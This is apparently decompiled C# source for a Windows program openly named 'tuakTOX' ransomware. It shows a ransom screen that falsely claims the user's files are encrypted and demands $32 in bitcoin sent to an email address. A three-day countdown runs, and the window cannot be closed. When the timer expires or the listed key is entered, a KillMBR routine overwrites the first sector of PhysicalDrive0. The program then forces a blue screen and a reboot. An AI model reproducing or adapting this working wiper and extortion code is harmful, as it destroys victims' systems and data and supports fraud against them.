using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace tuakTOX_ransomware;

public class tuaktoxransomware : Form
{
	private struct TOKEN_PRIVILEGES
	{
		public uint PrivilegeCount;

		public long Luid;

		public uint Attributes;
	}

	private const uint GENERIC_WRITE = 1073741824u;

	private const uint FILE_SHARE_WRITE = 2u;

	private const uint OPEN_EXISTING = 3u;

	private const uint FILE_ATTRIBUTE_NORMAL = 128u;

	private const uint EWX_REBOOT = 2u;

	private const uint EWX_FORCE = 4u;

	private const uint SE_SHUTDOWN_NAME = 19u;

	private const uint TOKEN_ADJUST_PRIVILEGES = 32u;

	private const uint TOKEN_QUERY = 8u;

	private const uint SHTDN_REASON_MAJOR_HARDWARE = 65536u;

	private const uint SHTDN_REASON_MINOR_DISK = 8u;

	private int totalSeconds = 259200;

	private int progressValue = 50;

	private IContainer components = null;

	private Label label1;

	private Button button1;

	private TextBox textBox1;

	private Timer timer1;

	private Label label4;

	private Label label6;

	private Label label5;

	private TextBox textBox2;

	private Label label8;

	private LinkLabel linkLabel1;

	private Label label7;

	private TextBox textBox3;

	private Label label3;

	private TextBox textBox4;

	private TextBox textBox5;

	private Button button2;

	private Label label2;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint responseOption, out uint response);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int RtlAdjustPrivilege(uint privilege, bool enable, bool currentThread, out bool enabled);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool AdjustTokenPrivileges(IntPtr tokenHandle, bool disableAllPrivileges, ref TOKEN_PRIVILEGES newState, uint bufferLength, IntPtr previousState, IntPtr returnLength);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetCurrentProcess();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int ExitWindowsEx(uint uFlags, uint dwReason);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hObject);

	public tuaktoxransomware()
	{
		InitializeComponent();
		timer1.Interval = 1000;
		timer1.Start();
		TimerSO();
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void label1_Click_1(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		totalSeconds--;
		if (totalSeconds <= 0)
		{
			((Form)this).Close();
			KillMBR();
			RtlAdjustPrivilege(19u, enable: true, currentThread: false, out var _);
			string s = new string('x', 1000);
			IntPtr intPtr = Marshal.StringToBSTR(s);
			NtRaiseHardError(3221225796u, 0u, 0u, IntPtr.Zero, 6u, out var _);
			OpenProcessToken(GetCurrentProcess(), 40u, out var tokenHandle);
			TOKEN_PRIVILEGES tOKEN_PRIVILEGES = default(TOKEN_PRIVILEGES);
			tOKEN_PRIVILEGES.PrivilegeCount = 1u;
			tOKEN_PRIVILEGES.Luid = 0L;
			tOKEN_PRIVILEGES.Attributes = 2u;
			TOKEN_PRIVILEGES newState = tOKEN_PRIVILEGES;
			LookupPrivilegeValue(null, "SeShutdownPrivilege", out newState.Luid);
			AdjustTokenPrivileges(tokenHandle, disableAllPrivileges: false, ref newState, 0u, IntPtr.Zero, IntPtr.Zero);
			ExitWindowsEx(6u, 65544u);
		}
		else
		{
			TimerSO();
		}
	}

	public void UpdateProgress(int newValue)
	{
		progressValue = newValue;
		((Control)this).Invalidate();
	}

	private void TimerSO()
	{
		int num = totalSeconds % 36000 / 3600;
		int num2 = totalSeconds % 3600 / 60;
		int num3 = totalSeconds % 60;
		Control obj = ((Control)this).Controls["label5"];
		Label val = (Label)(object)((obj is Label) ? obj : null);
		((Control)val).Text = $"{num:00}:{num2:00}:{num3:00}";
	}

	private void tuaktoxransomware_Load(object sender, EventArgs e)
	{
		LoadAllFoldersAndFilesRecursive();
	}

	private void LoadAllFoldersAndFilesRecursive()
	{
		((TextBoxBase)textBox2).Clear();
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string[] array = new string[5]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Path.Combine(environmentVariable, "Videos"),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Path.Combine(environmentVariable, "Downloads")
		};
		StringBuilder stringBuilder = new StringBuilder();
		string[] array2 = array;
		foreach (string text in array2)
		{
			if (!string.IsNullOrEmpty(text) && Directory.Exists(text))
			{
				ScanDirectoryData(text, stringBuilder);
			}
		}
		((Control)textBox2).Text = stringBuilder.ToString();
	}

	private void ScanDirectoryData(string currentDir, StringBuilder logBuilder)
	{
		try
		{
			string[] directories = Directory.GetDirectories(currentDir);
			string[] array = directories;
			foreach (string text in array)
			{
				try
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(text);
					string text2 = "";
					if ((directoryInfo.Attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
					{
						text2 = text2 ?? "";
					}
					if ((directoryInfo.Attributes & FileAttributes.System) == FileAttributes.System)
					{
						text2 = text2 ?? "";
					}
					logBuilder.AppendLine(text2 + directoryInfo.FullName);
					ScanDirectoryData(text, logBuilder);
				}
				catch
				{
					logBuilder.AppendLine(text ?? "");
				}
			}
		}
		catch (Exception ex)
		{
			logBuilder.AppendLine(currentDir + ": " + ex.Message + "]");
		}
		try
		{
			string[] files = Directory.GetFiles(currentDir);
			string[] array2 = files;
			foreach (string text3 in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(text3);
					string text4 = "";
					if ((fileInfo.Attributes & FileAttributes.Encrypted) == FileAttributes.Encrypted)
					{
						text4 = text4 ?? "";
					}
					if ((fileInfo.Attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
					{
						text4 = text4 ?? "";
					}
					if ((fileInfo.Attributes & FileAttributes.System) == FileAttributes.System)
					{
						text4 = text4 ?? "";
					}
					logBuilder.AppendLine(text4 + fileInfo.FullName);
				}
				catch
				{
					logBuilder.AppendLine(text3 ?? "");
				}
			}
		}
		catch (Exception ex2)
		{
			logBuilder.AppendLine(currentDir + ": " + ex2.Message + "]");
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).Text == "")
		{
			MessageBox.Show("Cannot Decrypt because you did not write also the keys wrong.", "Incorrect key", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).Text == "T3JTOX-7H1N3-WS32T")
		{
			MessageBox.Show("error: cannot decrypt because theres no decryptor here click ok to encrypt your pc", "pc encryptor", (MessageBoxButtons)0, (MessageBoxIcon)16);
			KillMBR();
			RtlAdjustPrivilege(19u, enable: true, currentThread: false, out var _);
			string s = new string('x', 1000);
			IntPtr intPtr = Marshal.StringToBSTR(s);
			NtRaiseHardError(3221225796u, 0u, 0u, IntPtr.Zero, 6u, out var _);
			OpenProcessToken(GetCurrentProcess(), 40u, out var tokenHandle);
			TOKEN_PRIVILEGES tOKEN_PRIVILEGES = default(TOKEN_PRIVILEGES);
			tOKEN_PRIVILEGES.PrivilegeCount = 1u;
			tOKEN_PRIVILEGES.Luid = 0L;
			tOKEN_PRIVILEGES.Attributes = 2u;
			TOKEN_PRIVILEGES newState = tOKEN_PRIVILEGES;
			LookupPrivilegeValue(null, "SeShutdownPrivilege", out newState.Luid);
			AdjustTokenPrivileges(tokenHandle, disableAllPrivileges: false, ref newState, 0u, IntPtr.Zero, IntPtr.Zero);
			ExitWindowsEx(6u, 65544u);
		}
	}

	private static void KillMBR()
	{
		IntPtr intPtr = CreateFile("\\\\.\\PhysicalDrive0", 1073741824u, 2u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
		if (!(intPtr == IntPtr.Zero) && !(intPtr == (IntPtr)(-1)))
		{
			byte[] lpBuffer = new byte[512];
			WriteFile(intPtr, lpBuffer, 512u, out var _, IntPtr.Zero);
			CloseHandle(intPtr);
		}
	}

	private void tuaktoxransomware_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void ProgressBar1_Paint(object sender, PaintEventArgs e)
	{
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		ProgressBar val = (ProgressBar)((sender is ProgressBar) ? sender : null);
		double num = (double)val.Value / (double)val.Maximum;
		int num2 = (int)((double)((Control)val).Width * num);
		e.Graphics.FillRectangle(Brushes.LightGray, 0, 0, ((Control)val).Width, ((Control)val).Height);
		e.Graphics.FillRectangle(Brushes.Red, 0, 0, num2, ((Control)val).Height);
		string text = $"{val.Value}%";
		Font val2 = new Font("Arial", 10f, (FontStyle)1);
		try
		{
			SizeF sizeF = e.Graphics.MeasureString(text, val2);
			e.Graphics.DrawString(text, val2, Brushes.Black, ((float)((Control)val).Width - sizeF.Width) / 2f, ((float)((Control)val).Height - sizeF.Height) / 2f);
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	private void progressBar1_Click(object sender, EventArgs e)
	{
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.youtube.com/watch?v=nZOF6oeEkdc");
	}

	private void button2_Click(object sender, EventArgs e)
	{
		Clipboard.SetText("alshamselias@gmail.com");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_02f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fa: Expected O, but got Unknown
		//IL_038b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0395: Expected O, but got Unknown
		//IL_0426: Unknown result type (might be due to invalid IL or missing references)
		//IL_0430: Expected O, but got Unknown
		//IL_056f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0579: Expected O, but got Unknown
		//IL_060b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0615: Expected O, but got Unknown
		//IL_0693: Unknown result type (might be due to invalid IL or missing references)
		//IL_069d: Expected O, but got Unknown
		//IL_06be: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c8: Expected O, but got Unknown
		//IL_080c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0816: Expected O, but got Unknown
		//IL_08a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b3: Expected O, but got Unknown
		//IL_0a0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a15: Expected O, but got Unknown
		//IL_0ae0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aea: Expected O, but got Unknown
		//IL_0ccb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cd5: Expected O, but got Unknown
		//IL_0d06: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d10: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(tuaktoxransomware));
		label1 = new Label();
		button1 = new Button();
		textBox1 = new TextBox();
		timer1 = new Timer(components);
		label4 = new Label();
		label6 = new Label();
		label5 = new Label();
		textBox2 = new TextBox();
		label8 = new Label();
		linkLabel1 = new LinkLabel();
		label7 = new Label();
		textBox3 = new TextBox();
		label3 = new Label();
		textBox4 = new TextBox();
		textBox5 = new TextBox();
		button2 = new Button();
		label2 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font("Yu Gothic UI", 25.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label1).ForeColor = Color.Red;
		((Control)label1).Location = new Point(10, 556);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(735, 59);
		((Control)label1).TabIndex = 0;
		((Control)label1).Text = "all your personal files are encrypted!";
		((Control)label1).Click += label1_Click_1;
		((Control)button1).BackColor = Color.Black;
		((Control)button1).ForeColor = Color.Red;
		((Control)button1).Location = new Point(22, 39);
		((Control)button1).Name = "button1";
		((Control)button1).Size = new Size(315, 41);
		((Control)button1).TabIndex = 3;
		((Control)button1).Text = "Decrypt";
		((ButtonBase)button1).UseVisualStyleBackColor = false;
		((Control)button1).Click += button1_Click;
		((Control)textBox1).BackColor = Color.Black;
		((Control)textBox1).ForeColor = Color.Red;
		((Control)textBox1).Location = new Point(22, 11);
		((Control)textBox1).Name = "textBox1";
		((Control)textBox1).Size = new Size(315, 22);
		((Control)textBox1).TabIndex = 4;
		((Control)textBox1).Text = "enter decrypt key here...";
		timer1.Tick += timer1_Tick;
		((Control)label4).AutoSize = true;
		((Control)label4).Font = new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label4).ForeColor = Color.Yellow;
		((Control)label4).Location = new Point(19, 241);
		((Control)label4).Name = "label4";
		((Control)label4).Size = new Size(160, 72);
		((Control)label4).TabIndex = 6;
		((Control)label4).Text = "you can also pay to:\r\n* coinbase.com\r\n* localbitcoins.com\r\n* coinfloor.co.uk";
		((Control)label6).AutoSize = true;
		((Control)label6).Font = new Font("Microsoft Sans Serif", 16.2f, (FontStyle)2, (GraphicsUnit)3, (byte)0);
		((Control)label6).ForeColor = Color.Red;
		((Control)label6).Location = new Point(14, 331);
		((Control)label6).Name = "label6";
		((Control)label6).Size = new Size(325, 32);
		((Control)label6).TabIndex = 8;
		((Control)label6).Text = "your files will be deleted:";
		((Control)label5).AutoSize = true;
		((Control)label5).Font = new Font("Microsoft Sans Serif", 16.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label5).ForeColor = Color.Red;
		((Control)label5).Location = new Point(16, 379);
		((Control)label5).Name = "label5";
		((Control)label5).Size = new Size(92, 32);
		((Control)label5).TabIndex = 9;
		((Control)label5).Text = "label5";
		((Control)textBox2).BackColor = Color.Black;
		((Control)textBox2).ForeColor = Color.Red;
		((Control)textBox2).Location = new Point(25, 453);
		((TextBoxBase)textBox2).Multiline = true;
		((Control)textBox2).Name = "textBox2";
		((TextBoxBase)textBox2).ReadOnly = true;
		textBox2.ScrollBars = (ScrollBars)3;
		((Control)textBox2).Size = new Size(341, 84);
		((Control)textBox2).TabIndex = 11;
		((Control)textBox2).TextChanged += textBox2_TextChanged;
		((Control)label8).AutoSize = true;
		((Control)label8).Font = new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label8).ForeColor = Color.Red;
		((Control)label8).Location = new Point(22, 422);
		((Control)label8).Name = "label8";
		((Control)label8).Size = new Size(298, 20);
		((Control)label8).TabIndex = 13;
		((Control)label8).Text = "your encrypted files is in the logs here:";
		((Control)linkLabel1).AutoSize = true;
		((Control)linkLabel1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)linkLabel1).Location = new Point(878, 590);
		((Control)linkLabel1).Name = "linkLabel1";
		((Control)linkLabel1).Size = new Size(284, 25);
		((Control)linkLabel1).TabIndex = 14;
		((Label)linkLabel1).TabStop = true;
		((Control)linkLabel1).Text = "how to make a bitcoin account?";
		linkLabel1.LinkClicked += new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked);
		((Control)label7).AutoSize = true;
		((Control)label7).Font = new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label7).ForeColor = Color.Red;
		((Control)label7).Location = new Point(910, 556);
		((Control)label7).Name = "label7";
		((Control)label7).Size = new Size(252, 20);
		((Control)label7).TabIndex = 15;
		((Control)label7).Text = "BTC (AES Strongest encryption)";
		((Control)textBox3).BackColor = Color.Black;
		((Control)textBox3).ForeColor = Color.Yellow;
		((Control)textBox3).Location = new Point(26, 129);
		((TextBoxBase)textBox3).Multiline = true;
		((Control)textBox3).Name = "textBox3";
		((TextBoxBase)textBox3).ReadOnly = true;
		textBox3.ScrollBars = (ScrollBars)2;
		((Control)textBox3).Size = new Size(313, 99);
		((Control)textBox3).TabIndex = 16;
		((Control)textBox3).Text = componentResourceManager.GetString("textBox3.Text");
		((Control)label3).AutoSize = true;
		((Control)label3).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label3).ForeColor = Color.Yellow;
		((Control)label3).Location = new Point(24, 92);
		((Control)label3).Name = "label3";
		((Control)label3).Size = new Size(296, 25);
		((Control)label3).TabIndex = 17;
		((Control)label3).Text = "how do i pay and buy my file?";
		((Control)textBox4).BackColor = Color.Black;
		((Control)textBox4).Font = new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)textBox4).ForeColor = Color.Red;
		((Control)textBox4).Location = new Point(372, 12);
		((TextBoxBase)textBox4).Multiline = true;
		((Control)textBox4).Name = "textBox4";
		((TextBoxBase)textBox4).ReadOnly = true;
		textBox4.ScrollBars = (ScrollBars)2;
		((Control)textBox4).Size = new Size(790, 440);
		((Control)textBox4).TabIndex = 18;
		((Control)textBox4).Text = componentResourceManager.GetString("textBox4.Text");
		((Control)textBox5).BackColor = Color.Black;
		((Control)textBox5).ForeColor = Color.Yellow;
		((Control)textBox5).Location = new Point(398, 489);
		((Control)textBox5).Name = "textBox5";
		((TextBoxBase)textBox5).ReadOnly = true;
		((Control)textBox5).Size = new Size(461, 22);
		((Control)textBox5).TabIndex = 19;
		((Control)textBox5).Text = "alshamselias@gmail.com";
		((Control)button2).BackColor = Color.Black;
		((Control)button2).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)button2).ForeColor = Color.Yellow;
		((Control)button2).Location = new Point(883, 480);
		((Control)button2).Name = "button2";
		((Control)button2).Size = new Size(268, 42);
		((Control)button2).TabIndex = 20;
		((Control)button2).Tag = "";
		((Control)button2).Text = "Copy";
		((ButtonBase)button2).UseVisualStyleBackColor = false;
		((Control)button2).Click += button2_Click;
		((Control)label2).AutoSize = true;
		((Control)label2).Font = new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label2).ForeColor = Color.Yellow;
		((Control)label2).Location = new Point(394, 517);
		((Control)label2).Name = "label2";
		((Control)label2).Size = new Size(361, 20);
		((Control)label2).TabIndex = 21;
		((Control)label2).Text = "Send 32$ worth of bitcoin to this Email address";
		((ContainerControl)this).AutoScaleDimensions = new SizeF(8f, 16f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.Black;
		((Form)this).ClientSize = new Size(1174, 637);
		((Control)this).Controls.Add((Control)(object)label2);
		((Control)this).Controls.Add((Control)(object)button2);
		((Control)this).Controls.Add((Control)(object)textBox5);
		((Control)this).Controls.Add((Control)(object)textBox4);
		((Control)this).Controls.Add((Control)(object)label3);
		((Control)this).Controls.Add((Control)(object)textBox3);
		((Control)this).Controls.Add((Control)(object)label7);
		((Control)this).Controls.Add((Control)(object)linkLabel1);
		((Control)this).Controls.Add((Control)(object)label8);
		((Control)this).Controls.Add((Control)(object)textBox2);
		((Control)this).Controls.Add((Control)(object)label5);
		((Control)this).Controls.Add((Control)(object)label6);
		((Control)this).Controls.Add((Control)(object)label4);
		((Control)this).Controls.Add((Control)(object)textBox1);
		((Control)this).Controls.Add((Control)(object)button1);
		((Control)this).Controls.Add((Control)(object)label1);
		((Form)this).Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = "tuaktoxransomware";
		((Control)this).Text = "** tuakTOX 256 bit encryption **";
		((Form)this).FormClosing += new FormClosingEventHandler(tuaktoxransomware_FormClosing);
		((Form)this).Load += tuaktoxransomware_Load;
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
